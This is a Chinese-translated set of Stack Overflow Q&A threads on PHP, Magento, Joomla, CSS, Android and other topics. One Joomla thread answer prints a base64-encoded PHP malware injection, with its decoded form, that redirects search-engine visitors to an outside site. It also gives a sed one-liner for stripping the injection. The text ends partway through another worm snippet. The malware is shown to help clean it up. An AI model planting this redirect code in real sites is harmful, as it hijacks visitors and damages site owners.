> 时间：2012-06-22T12:01:54.053

您是在谈论由 Visual Studio 解决方案生成的 DLL 吗？如果是这样的话，将它们置于源代码控制之下是一个**非常糟糕的主意**，至少在它们生成的位置！

如果您仍想将 DLL 存储在源代码管理中，请在某处创建一个“存储库”文件夹并将生成的文件复制到那里，但不要将 Visual Studio 生成的每个文件夹（Bin、Obj 等）都置于源代码管理之下。 )

# php - 如何在 Magento 中获取当前主题名称

> ID：11155570
> 
> 赞同：9
> 
> 时间：2012-06-22T11:46:17.493
> 
> 标签：php, magento

在 magento 中，我试图获取当前主题或包名称，但没有找到任何东西。我使用了 getSkinUrl(') 但它返回的皮肤路径不是包或主题名称。请帮助我如何获取主题或包名称。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-06-22T13:23:43.117

**当前套餐**

```
Mage::getSingleton('core/design_package')->getPackageName() 
```

**当前主题（前端）**

```
Mage::getSingleton('core/design_package')->getTheme('frontend') 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2013-10-14T02:09:34.017

请注意，@Drew Hunter 的上述回答并不完全正确。虽然`getTheme()`是所需的函数调用，但字符串 'frontend' 不是此方法可接受的参数。此方法唯一允许的值是：

*   语言环境
*   布局
*   模板
*   默认
*   皮肤

也就是说，这个函数的正确用法是以下几行之一：

```
Mage::getSingleton('core/design_package')->getTheme()
Mage::getSingleton('core/design_package')->getTheme('locale')
Mage::getSingleton('core/design_package')->getTheme('layout')
Mage::getSingleton('core/design_package')->getTheme('template')
Mage::getSingleton('core/design_package')->getTheme('default')
Mage::getSingleton('core/design_package')->getTheme('skin') 
```

未能以这种方式使用该方法将**始终**返回字符串“默认”。

**意外结果**

使用不当会产生逻辑错误。例如，如果您定义了一个“匹配表达式”以专门针对移动设备。

```
Mage::getSingleton('core/design_package') 
```

引用以下类

```
Mage_Core_Model_Design_Package 
```

通过查看此类中的“getTheme()”方法，您会注意到可以传递此方法的可能选项，它们是“语言环境”、“布局”、“模板”、“默认”和“皮肤”。

因此，如果特定商店有“模板”的“匹配表达式”，如下所示

```
iPhone|iPod|Mobile|mobile > mobile 
```

可能会出现以下情况

```
Mage::getSingleton('core/design_package')->getTheme('frontend') RETURNS 'default'
Mage::getSingleton('core/design_package')->getTheme('template') RETURNS 'mobile' 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2013-03-07T15:27:26.230

自从

```
Mage::getSingleton('core/design_package') 
```

相当于

```
Mage::getDesign() 
```

Drew 的例子可以简化为：

```
Mage::getDesign()->getPackageName() 
```

和

```
Mage::getDesign()->getTheme('frontend') 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-08-23T14:18:09.603

这是另一种方式：

```
$package = Mage::getStoreConfig('design/package/name');
$skin_name = Mage::getStoreConfig('design/theme/skin'); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-06-24T11:41:45.003

想将此添加为评论，但您也可以直接从数据库中获取它

```
SELECT * FROM core_config_data WHERE path="design/theme/skin";
SELECT * FROM core_config_data WHERE path="design/package/name"; 
```

这对管理员来说可能比实时使用更有用，如果你在 magento 中设计模板或编码，你应该使用 magento 函数。

# php - joomla 中的多语种文章

> ID：11155574
> 
> 赞同：0
> 
> 时间：2012-06-22T11:46:29.397
> 
> 标签：php, multilingual, joomla2.5

我需要帮助更改 joomla2.5.4 内容的语言。

我已经安装了德语语言包并使用语言切换器来切换语言。

我已经完成了所有步骤，它改变了 joomla 自己文章的语言，但不是我的文章，我是怎么做到的？我想保留一个文章的网址并更改语言我创建的文章语言将如何更改？

抱歉英语不好..我已按照此 url [Building Multi-lingual Joomla 2.5 Sites中给出的所有这些步骤进行操作](http://www.ostraining.com/blog/joomla/joomla-multi-lingual/)

请帮我解决这个问题。我在哪里做错了？

问候，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-25T10:24:40.360

看看来自[Joomla 的教程！文档 - Joomla 1.6 的语言切换器教程](http://docs.joomla.org/Language_Switcher_Tutorial_for_Joomla_1.6)

对我来说，它工作得很好。

# sql - 异步服务器，在等待回调时处理断开连接

> ID：11155576
> 
> 赞同：2
> 
> 时间：2012-06-22T11:46:31.593
> 
> 标签：sql, c, asynchronous, tcp, unix-socket

根据异步服务器管理，我有一个问题。我正在使用**libevent2**和（出于我自己的学习经验）普通的 ANSI C。我使用 apache2 utils 中的 ab 进行压力测试。主要是`-n 10000`和`-c 400`。我的数据库是本地网络中 debian 计算机上的 sql 服务器。所以连接速度非常快。`--leak-check=full --show-reachable=yes`我还使用 valgrind ( )来分析我的应用程序

我现在有一个问题。当我对 sql 数据库进行同步调用时，一切正常。但这一切都是在主线程上完成的，因此新客户端接收数据需要一些时间（在压力运行时）。当我对 sql 数据库进行异步调用时，只要在 sql 调用返回之前没有客户端断开连接，一切正常。一旦 sql 调用返回并且客户端已经断开连接，我会得到很多无效的读取错误（当然），因为它的缓冲区已经被释放，套接字已关闭等。我已经尝试了很多不同的东西但不能t 得到适当的解决方案。

我只是想问一下你一般是如何处理这样的事情的？例如，您是否保留了一个 BST，其中包括所有连接的客户端，并且当异步调用返回时，您会在其中搜索它？如果它仍然在那里，你执行回调，否则丢弃它？我认为这可能会严重影响性能。我还尝试检查套接字是否仍然打开，但这有点奇怪。 `recv(fd, buffer, 1, MSG_PEEK)`总是`returned -1`（在打开和关闭的非阻塞套接字上）..

好吧，很难解释我已经做了什么，所以我只是等待你们会回答:-)

问候马库斯

更新：我只是有一个疯狂的想法，为每个连接使用互斥锁。当我进入异步调用时，我将其锁定，并在它返回后将其释放.. :-) 但我不相信这种方法.. 听起来不对.. 任何人都可以推荐这种方法吗？

更新 2：我尝试了我的想法，效果很好。正确处理有点棘手，但锁定做到了

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T01:54:55.847

每个连接的锁定工作正常，但它有几个缺点：

*   产量是每个连接一个未完成的请求。这限制了您的应用程序可以扩展的程度。

*   当您扩展连接数量时，应用程序必须创建的互斥锁数量也可能是一个问题。

最好的办法是将“连接和客户端请求管理”与“SQL 查询管理”分离，就像您提到的那样。这需要您将响应与请求相匹配。当您扩大规模以服务数十万个请求时，查找成本将微不足道。还有一些方法可以对此进行优化（例如，两级查找，首先针对客户端，然后针对来自该客户端的请求）。对于客户端查找，您可以为每个客户端分配一个 ID 并实现快速搜索操作。

# cakephp - Web 服务中的 Cakephp 用户身份验证

> ID：11155578
> 
> 赞同：1
> 
> 时间：2012-06-22T11:46:49.350
> 
> 标签：cakephp, cakephp-2.0

蛋糕PHP 2.1。我正在开发一个 cakephp 应用程序，也是第三方应用程序访问数据的 Web 服务。输出为 json。

当用户第一次通过 Web 服务登录时，我们创建了一些身份验证令牌，并且每次下一次调用客户端都会发送身份验证令牌，我必须检查可用的身份验证令牌以允许应用程序的其他操作。

我写了一个登录功能。当用户尝试登录时，它会返回成功或失败消息。这就是我卡住的地方。如何创建此身份验证令牌？cakephp 在哪里存储用户相关会话？我可以像这样写会话吗

> $this->Session->Write('check.session','随机字符串')

然后在第二次通话中使用

$this->Session->read('check.session')。

或者有没有其他更好的方法来实现这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T13:39:15.860

没关系，（小写写！）如果您使用的是 Auth 组件，您也可以将其存储在其中。

```
$this->Session->write('Auth.User.auth_token',$auth_token);

#stored in the session at

['Auth']['User']['auth_token'] 
```

您可能需要安装[DebugKit](https://github.com/cakephp/debug_kit)，这是一个用于调试（包括浏览会话）的出色工具。

# extjs4 - ExtJS 4.1 - 如何动态添加项目到工具栏？

> ID：11155579
> 
> 赞同：2
> 
> 时间：2012-06-22T11:46:50.720
> 
> 标签：extjs4, toolbar, extjs4.1

我正在尝试将窗口最小化为任务栏上的按钮 - 这实际上是一个工具栏，但我无法将按钮动态添加到任务栏。我尝试调用`doLayout()`函数，但它也不起作用。

这是我尝试过的 - 任何帮助将不胜感激！

提前致谢。

```
<script type="text/javascript">
     this.addListener('show', function(win) {
          taskbar.add(me.taskButton);
          taskbar.doLayout();
     });
</script> 
```

变量：

*   **win** : 最小化的窗口
*   **任务栏**：在我的视口南部区域呈现的工具栏

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-23T13:14:15.920

`doLayout`我很确定您在使用 component 时不需要这样做`add`。该框架已经为您完成了渲染，因此无需`doLayout`再次进行渲染。

我怀疑您的事件侦听器未正确连接。查看我的工作示例，如下所示：

[http://jsfiddle.net/chaoszcat/sHrGH/](http://jsfiddle.net/chaoszcat/sHrGH/)

# asp.net-mvc - 具有多个输入提交的 T4MVC Html.BeginForm

> ID：11155581
> 
> 赞同：1
> 
> 时间：2012-06-22T11:47:10.590
> 
> 标签：asp.net-mvc, model-binding, t4mvc, html.beginform, input-button-image

控制器...

```
[HttpPost]
public virtual ActionResult PickAColour(ColourModel model, 
                                        string imgbtn, string returnUrl) { 
```

和视图...

```
@using (Html.BeginForm(MVC.Home.PickAColour(Model,"",(string)ViewBag.ReturnUrl))) {
    @Html.LabelFor(m => m.SomeProperty)
    @Html.TextBoxFor(m => m.SomeProperty)
    ...
    ...
    <p>Now pick a colour</p>
    <input type="image" name="imgbtn" src="@Links.Content.Images.A_png" value="A"/>
    <input type="image" name="imgbtn" src="@Links.Content.Images.B_png" value="B"/>
    <input type="image" name="imgbtn" src="@Links.Content.Images.C_png" value="C"/>
    <input type="image" name="imgbtn" src="@Links.Content.Images.D_png" value="D"/>
    <input type="image" name="imgbtn" src="@Links.Content.Images.E_png" value="E"/>
    <input type="image" name="imgbtn" src="@Links.Content.Images.F_png" value="F"/>
} 
```

现在，这不起作用，因为我没有将 imgbtn 参数传递给方法。我不知道正确的方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T11:52:11.867

您必须使用正确的方法重载：

```
@Html.BeginForm(MVC.Home.ActionNames.PickAColour, MVC.Home.Name,
                new { imgbtn = "", returnUrl = (string)ViewBag.ReturnUrl },
                FormMethod.Post, null) 
```

至于复杂的模型对象`Model`，你不能像上面那样使用路由值来传递它。单击提交按钮时应提交此文件，以便 ASP.NET MVC 模型绑定器可以完成其工作。

# php - 支架错位？我的代码有什么问题？

> ID：11155582
> 
> 赞同：0
> 
> 时间：2012-06-22T11:47:16.120
> 
> 标签：php

在下面的代码中，我想我搞砸了这部分：`if ( (1 || 2) != $current_user->ID )`. 也许是一个放错位置的支架，我不确定。我不精通PHP，所以我确定这是一个简单的错误。

```
if ( (1 || 2) != $current_user->ID ) {
add_action('admin_menu', 'remove_menus_users');
} 
```

如果有人可以帮助我，我将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T11:49:20.127

以下更正应该可以解决您的问题。

```
if ( 1 != $current_user->ID && 2 != $current_user->ID) {
add_action('admin_menu', 'remove_menus_users');
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T11:49:51.287

你`if`归结为`if ((true) != $current_user->ID )`. 如果要针对多个条件测试一个变量，请每次检查：

```
if (($current_user->ID == 1) || ($current_user->ID == 2)) ... 
```

但是您可能想研究角色。如果您的站点变得非常繁忙，并且您想分配另一个用户的管理员权限但他的 ID 是 872，您是否要对这个 ID 进行硬编码？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T11:49:07.540

尝试这个

```
 if($current_user->ID != 1 || $current_user->ID != 2){
     add_action('admin_menu', 'remove_menus_users');

 } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-22T11:50:44.000

你的逻辑有缺陷。你不能有“如果它不等于一个数字，或者它不等于一个不同的数字”，因为它总是不等于其中一个。

您还应该颠倒您的比较顺序。将变量与数字匹配，而不是将数字与变量匹配。以下假设您要确保当前用户 ID 不等于 1 或 2。

```
if ($current_user->ID!=1 && $current_user->ID!=2) {

} 
```

# text - 如果文本超出 Corona 中的屏幕宽度，如何将文本移动到下一行？

> ID：11155583
> 
> 赞同：0
> 
> 时间：2012-06-22T11:47:17.737
> 
> 标签：text, lua, screen, coronasdk

如果文本超出屏幕宽度，我希望文本自动继续到下一行。我怎样才能做到这一点？

例如，这个在 Android 屏幕上是超出的，我希望它在屏幕上完全可见。

```
local str=display.newText("HOSGELDINIZ",50,200,nil,70) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T00:21:29.950

我找到了答案。为了避免超出，我们需要再添加两个限制文本区域的参数。

就像这样：

```
 local str=display.newText("HOSGELDINIZ",50,200,150,150,nil,70) 
```

在高度和宽度位置之后，我们添加文本区域的宽度和高度，以便它在不超过屏幕的情况下换行。

我希望这会有用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-11T16:31:29.437

截至今天，使用 Corona 发送多行文本是在[options](https://docs.coronalabs.com/api/library/display/newText.html)中完成的。这是一个简单的例子：

```
display.newText({
        parent   = myParent,
        text     = "This is a long enough text to be on two lines",  
        width    = display.contentWidth*0.6,  
        height   = display.contentHeight*0.25,  
        x        = display.contentWidth*0.5,
        y        = display.contentHeight*0.5,
        fontSize = 24,
        align    = "center",
    }) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-12-08T11:41:49.557

如果您只想在新行上显示单个文本字符串，可以使用以下方法。

```
local displayStr=display.newText(“this sample text can be split with \nto next line “, x, y, native.systemFont, fontSize) 
```

[注意文本中如何使用 '\n' 来拆分字符串]

# entity-framework - 实体框架上下文的接口

> ID：11155584
> 
> 赞同：0
> 
> 时间：2012-06-22T11:47:17.817
> 
> 标签：entity-framework, c#-4.0, entity-framework-4, interface

我有两个上下文提供程序的实现，我知道还会有更多的实现。我想创建接口来为那些通用的实体工作。

```
public class TDataProvider
    {
        public TEntities GetDataContext()
        {
            return new TTEntities();
        }
    }

public class TDataProvider
    {
        public TEntities GetDataContext()
        {
            return new TTEntities();
        }
    } 
```

我想使用在每种情况下都实现的接口，例如但是如何在 ADO.NET 实体数据模型生成的实体模型上实现后续接口？

```
public class IGetDataContext
    {
        T GetDataContext();
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-14T11:47:24.943

我没有在上下文中创建接口，而是创建了负责操作的数据访问类并针对它创建了单元测试。

它是我能想到的最好的。

# string - 从 javascript eval() 函数返回一个“字符串”

> ID：11155591
> 
> 赞同：1
> 
> 时间：2012-06-22T11:48:18.900
> 
> 标签：string, eval

我正在尝试评估像`a == b ? 'Ok' : 'Cancel';`使用 JavaScript这样的表达式，`eval()`但显示错误。

有什么方法可以执行并返回字符串`eval()`吗？

问候， Nwbrd

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T11:54:39.257

您的错误可能与调用之前有关`a`或`b`未定义`eval()`，例如：以下代码在`eval()`调用按预期*返回*字符串时正常工作。

```
var a = 5, b = 6;
var result = eval("a == b ? 'SAME' : 'DIFFERENT'");
alert(result); 
```

# html - 如何仅使用 CSS 使标签之间的距离相同？

> ID：11155596
> 
> 赞同：3
> 
> 时间：2012-06-22T11:48:39.467
> 
> 标签：html, css

我有以下页面结构：

```
<span>content01</span>
<span>content02</span>
<span>content03</span>
<br/>
<span>content04</span>
<span>content05</span>
<span>content06</span>
<br/>
<span>content07</span>
<span>content08</span>
<span>content09</span>
<br/>
... 
```

结果，我的数据看起来像一个包含三列的表。每个`span`标签的内容是某个单词。但这看起来是歪的，因为所有的词都是不同的，有不同的长度。而且我希望每行中的列之间的距离相同。我的问题可以通过使用`table`标签或将每个标签包装`span`在一个单独的`div`. 但我只想通过使用 CSS 来达到预期的效果。这可能吗？例如，我尝试使用以下内容：

```
span {
    width: 60px;
    height: 20px;
    padding: 40px;  
} 
```

或以下内容：

```
span {
    width: 60px;
    height: 20px;
    margin: 40px;  
} 
```

但它不起作用...

提前致谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-22T11:50:30.270

span 标签上的**display**属性应该是`**inline-block**`，因为**span 标签**是`inline`默认的，我们也需要它作为一个**块**。

所以只需更改`inline`为`inline-block`，如下所示：

```
span {
    width: 60px;
    height: 20px;
    margin: 40px;
    display:inline-block;    
} 
```

现场演示：http: [//jsfiddle.net/max59/](http://jsfiddle.net/mAX59/)

参考：[http ://reference.sitepoint.com/html/span](http://reference.sitepoint.com/html/span)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T11:51:20.173

您必须指定`display: inline-block`属性，然后它将起作用。

**注意：**标签`<span>`用于对文档中的内联元素进行分组，您不能在内联元素上设置`width`或设置`height`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-22T11:54:45.630

尝试插入css：

```
 .cell{
display:inline-block; width: 60px;
    } 
```

然后在 HTML

```
<span class="cell"></span> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-22T11:54:33.903

您的问题的答案是：`width`不适用于内联元素。除了你现在的风格，给你`span`的风格。`display:inline-block`

但你的问题还有更多。你不想使用桌子的理由很模糊，听起来你属于“从不使用桌子，因为桌子是邪恶的”人群。
不要掉进那个陷阱。桌子很好。表很有用！当然，是的，它们可以被滥用，但你也可以滥用其他元素。你现在的做法是滥用`<br>`元素！

# android - 查看 Flipper Android

> ID：11155599
> 
> 赞同：0
> 
> 时间：2012-06-22T11:48:48.737
> 
> 标签：android, animation

我在鳍状肢中几乎没有要制作动画的图像，当按下下一个按钮时，下一个图像应该来自右侧，当前图像应该从左侧出来，同样，如果按下后退，前一个应该来自右侧，当前图像应该出去。我想在动画中左进右出，左进右出，还要记住堆大小，任何机构都有解决方案吗？我用了这段代码

```
 nbtn.setOnClickListener(new OnClickListener() {
    @Override
    public void onClick(View v) {
        if (current_shown_index < list.length - 1) {
            current_shown_index++;           
            bkbtn.setVisibility(View.VISIBLE);
            View view = inflater.inflate(R.layout.view_flipper_item, null);
            ImageView iv = (ImageView) view.findViewById(R.id.iv_flipper_item);                 
            iv.setImageResource(list[current_shown_index]);
            Log.v("count", vFlipper.getChildCount() + "flipper length");
            if (vFlipper.getChildCount() == 3) {                       
                vFlipper.removeViewAt(0);
            }
            vFlipper.addView(view);               
            vFlipper.setInAnimation(inFromRightAnimation());      
            vFlipper.setOutAnimation(outToLeftAnimation());
            vFlipper.showNext();
        }
    }
});
bkbtn.setOnClickListener(new View.OnClickListener() {
    public void onClick(View view) {                
        if (current_shown_index > 0) {                  
            int diff = 2;
            if (vFlipper.getChildCount() == 3 ){          
                vFlipper.removeViewAt(2);                   
            }
            View viewb = inflater.inflate(R.layout.view_flipper_item, null);
            ImageView iv = (ImageView) viewb.findViewById(R.id.iv_flipper_item);
            if(current_shown_index == 1 ){
                diff = 1;
            }else{                     
                iv.setImageResource(list[current_shown_index-diff ]);
            }
            vFlipper.addView(viewb, 0);
            current_shown_index--;
        }else{                 
            bkbtn.setVisibility(View.GONE);
        }             
        vFlipper.setInAnimation(inFromLeftAnimation());        
        vFlipper.setOutAnimation(outToRightAnimation());
        vFlipper.showPrevious();
    }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T18:21:46.570

ViewSwitcher 可以为你处理这个，[这里](http://www.youtube.com/watch?v=pGLabREOodc&feature=relmfu)是一个视图切换器

您还可以在此处找到附有源代码的[示例](http://www.youtube.com/watch?v=mGwG8-chUEM)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T11:53:34.167

我会给你一个起点：

```
final Animation outToLeft = AnimationUtils.loadAnimation(this, android.R.anim.slide_out_right); 
final Animation inFromRight = AnimationUtils.loadAnimation(this, android.R.anim.slide_in_left);

final Animation outToRight = AnimationUtils.loadAnimation(this, android.R.anim.slide_out_left); 
final Animation inFromLeft = AnimationUtils.loadAnimation(this, android.R.anim.slide_in_right); 
```

现在在你`setInAnimation`的.`setOutAnimation``ViewFlipper`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T11:53:55.197

要在 ViewFlipper 中实现进出动画，可以使用`setInAnimation()`和`setOutAnimation()`方法。

**例如：**

```
 viewFlipper.setInAnimation(AnimationUtils.loadAnimation(
                            mContext, android.R.anim.slide_in_right));
    viewFlipper.setOutAnimation(AnimationUtils.loadAnimation(
                            mContext, android.R.anim.slide_out_right));

   /* Where - mContext is Context object     
   */ 
```

# ios - 继续推送信息到第三个 UIView

> ID：11155600
> 
> 赞同：0
> 
> 时间：2012-06-22T11:48:54.557
> 
> 标签：ios, uiview, uitableview

我有带有三个部分的分组样式的表格视图。从字典数组中获取信息。

我的应用程序适用于 UITable (Master) 和一个 UIView (root)。但是，我想继续将信息从选择的 Cell 推送到直接连接到 UIView（根）的第三个 UIView。

-UIView（根）有：

```
.h    
@property (strong, nonatomic) id detailItem;

.m
#import "DetailViewController.h"

@interface DetailViewController ()
- (void)configureView;
@end

@implementation DetailViewController

@synthesize detailItem = _detailItem;
@synthesize courseDetailLabel = _courseDetailLabel;

#pragma mark - Managing the detail item

- (void)setDetailItem:(id)newDetailItem
{
    if (_detailItem != newDetailItem) {
        _detailItem = newDetailItem;

        // Update the view.
        [self configureView];
    }
}

- (void)configureView
{
    // Update the user interface for the detail item.

    if (self.detailItem) {

        self.courseDetailLabel.text = [[self.detailItem valueForKey:@"courseDetails"] description];
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:52:27.220

您应该重新考虑您的设计 - 如果在整个应用程序的许多屏幕上需要填充您的视图/表格/单元格/等所需的数据，您应该创建一个管理这些数据的单例类，并且可以从任何需要它的视图控制器访问。这样，您需要在视图之间“推送”的只是将控制器指向所需数据的索引。

# php - PHP Mail 无法通过 url 发送

> ID：11155606
> 
> 赞同：0
> 
> 时间：2012-06-22T11:49:23.763
> 
> 标签：php, email

我尝试使用 php 发送电子邮件。如果我通过控制台启动脚本，它工作正常： php mail.php" 但如果我尝试通过浏览器调用脚本，它就不起作用`http://localhost/mail.php`。

```
<?php
$sender = "test@mydomain.com";
$empfaenger = "me@mydomain.com";
$betreff = "Testmail";
$mailtext = "Test";
if(mail($empfaenger, $betreff, $mailtext, "From: $sender")) {
 echo "works";
} else {
 echo "dont";
}
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:58:47.257

从 php 在 localhost 上发送邮件不能以常规方式工作。按照**[此链接](http://roshanbh.com.np/2007/12/sending-e-mail-from-localhost-in-php-in-windows-environment.html)**查看如何在 localhost 上模拟邮件服务器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T12:42:45.377

如果您运行 url 则不会发送邮件，因为邮件功能仅在实时服务器上工作。

如果你想在本地发送邮件，那么你需要连接 smtp。

在运行本地 url 时连接 smtop 后，发送邮件

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T12:30:40.400

您可以使用 IMAP 连接到主机邮件并在 localhost 中发送电子邮件

见这里：[http ://www.php.net/manual/en/function.imap-open.php](http://www.php.net/manual/en/function.imap-open.php)

# jquery - 覆盖插件选项默认值

> ID：11155610
> 
> 赞同：2
> 
> 时间：2012-06-22T11:49:30.743
> 
> 标签：jquery, variables, options, defaults

```
$.fn.formreg=function(options){
 options = $.extend({}, $.fn.formreg.defaults, options);
 return this.each(function() {
 var $this =  $(this) ;  
   });         
  };

$.fn.formreg.defaults={
stepWidths:0,
 sliding_time:200,
 step_opacity:0.8,
 'step_id':'steps',
 nav_id:'navigation'
} 
```

这就是我使用插件和传递选项值的方式。

```
$('#formElem').formreg({
     sliding_time:900,  //sliding time 
     step_opacity:0.2, // FieldSet alpha effect when sliding  , 1 means 100%
     step_id:'steps2', // Id of the sliding main container .. 
     nav_id:'navigation2', // Id of navigation bottom buttons..
    }); 
```

问题是无论发送什么值，值都不会改变

# redirect - 我的网站谷歌搜索链接被重定向到一些未知的网站

> ID：11155618
> 
> 赞同：2
> 
> 时间：2012-06-22T11:50:00.533
> 
> 标签：redirect, joomla1.5, google-search, virus

今天在检查我的网站时，发现了这个问题。

以下是问题的详细信息：

当我用 Google 搜索我的网站时，它会一如既往地出现在 Google 结果页面中。

但是，当我在搜索结果中单击指向我网站的链接时，在处理后将我重定向到某个随机 URL（在与我不同的域上）需要一些时间来重定向我。

如果我尝试直接访问，通过浏览器直接输入地址，它也可以正常工作。

该网站正在运行 Joomla 版本 1.5.20。

我已经搜索过这个问题，我正在分享我搜索网络后得到的内容。

1.  所有论坛都说这是受到黑客或病毒攻击的感染。

2.  所有论坛都说唯一的解决办法是重新安装Joomla。

3.  只有 Joomla 和 WordPress 网站受到影响。

4.  这种威胁存在于 PHP 代码的某个地方。

5.  为了防止这种情况在未来使用模板、插件等的更新。

这就是我所有的研究，现在有没有人知道如何在**不重新安装的情况下**解决这个问题以及**防止这种情况发生的提示**？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-22T19:46:56.697

终于把问题解决了，在deadline之前，下面是详细信息：

首先威胁是什么：

它是一个简单的 Base64 编码 PHP 脚本，我在我网站的所有文件中都找到了它，它的外观如下：

```
eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vaGluaWEuenlucy5jb20vIik7DQpleGl0KCk7DQp9Cn0KfQ0KfQ0KfQ==")); 
```

这是 base64 编码的代码，现在这里是 PHP 的实际代码，在解码此字符串后将运行：

```
error_reporting(0);
$qazplm=headers_sent();
if (!$qazplm){
$referer=$_SERVER['HTTP_REFERER'];
$uag=$_SERVER['HTTP_USER_AGENT'];
if ($uag) {
if (!stristr($uag,"MSIE 7.0")){
if (stristr($referer,"yahoo") or stristr($referer,"bing") or stristr($referer,"rambler") or stristr($referer,"gogo") or stristr($referer,"live.com")or stristr($referer,"aport") or stristr($referer,"nigma") or stristr($referer,"webalta") or stristr($referer,"begun.ru") or stristr($referer,"stumbleupon.com") or stristr($referer,"bit.ly") or stristr($referer,"tinyurl.com") or preg_match("/yandex\.ru\/yandsearch\?(.*?)\&lr\=/",$referer) or preg_match ("/google\.(.*?)\/url\?sa/",$referer) or stristr($referer,"myspace.com") or stristr($referer,"facebook.com") or stristr($referer,"aol.com")) {
if (!stristr($referer,"cache") or !stristr($referer,"inurl")){
header("Location: http://hinia.zyns.com/");
exit();
}
}
}
}
} 
```

正如您在代码中看到的，这只会针对搜索引擎，所以现在清楚这就是威胁。

现在通过我的网站猜猜这重复了多少时间？？？

你不会相信，它重复了大约**10,000 次**，我在每个地方都得到了它，无论是模块、插件、管理、库等，对每个文件进行排序。

所以为了让我的网站再次运行，我必须删除每一行，我做了同样的事情，因此你可以再次检查网站运行良好。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-22T12:24:38.577

尝试禁用插件，这里有一个教程： [http](http://www.ostraining.com/blog/joomla/disable-a-joomla-plugin/) ://www.ostraining.com/blog/joomla/disable-a-joomla-plugin/ 如果它可以工作，您将能够识别哪个插件被感染。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-06-05T08:55:59.163

这是一些 CMS 经常出现的问题。这是一个脚本，可以 100% 解决您的问题。

```
find . \( -name "*.php" \) -exec grep -Hn "[\t]*eval(base64_decode(.*));" {} \; -exec sed -i 's/[\t]*eval(base64_decode(.*));//g' {} \; 
```

你必须在控制台中运行它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-08-27T18:25:46.703

我有类似的问题。位于 wp 核心文件中的损坏文件：index.php、wp-config.php。在那里发现了这个蠕虫希望能帮助别人！

```
<?php
if(!defined('_NET'))
{   
error_reporting(0);
$NET='shl-ed1'; 
define('_NET',$NET);
